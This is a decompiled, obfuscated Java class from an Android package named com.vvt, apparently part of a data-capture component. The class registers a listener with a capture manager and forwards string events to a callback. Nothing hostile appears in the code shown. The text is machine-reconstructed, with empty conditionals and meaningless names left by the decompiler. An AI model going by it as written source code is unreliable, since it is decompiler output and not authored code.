package com.vvt.al.c;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.c.h;

public class a
  implements e, i
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private i c;
  private h d;
  private boolean e;
  
  public a()
  {
    h localh = h.a();
    this.d = localh;
  }
  
  public void a() {}
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      h localh = this.d;
      if (localh != null)
      {
        localh = this.d;
        localh.a(this);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    this.c.a(paramString);
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = this.e;
    if (bool)
    {
      bool = b;
      if (bool) {}
      i locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      bool = false;
      this.e = false;
      h localh = this.d;
      if (localh != null)
      {
        localh = this.d;
        localh.b(this);
      }
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/MyUncaughtExceptionHandler/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */